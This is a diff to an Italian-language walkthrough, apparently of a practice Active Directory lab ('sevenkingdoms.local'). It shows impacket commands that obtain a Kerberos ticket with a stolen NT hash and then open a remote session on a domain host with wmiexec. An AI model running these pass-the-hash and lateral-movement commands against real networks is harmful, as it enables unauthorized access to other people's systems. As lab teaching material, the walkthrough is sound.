@@ -288,9 +288,9 @@ Con l'hash NT otteniamo un TGT
 impacket-getTGT -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark
 ```
 ```bash
-export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
+export KRB5CCNAME=./catelyn.stark.ccache
 ```
 Con wmiexec puoi fare l'accesso
 ```bash
-export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
+impacket-wmiexec -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
 ```
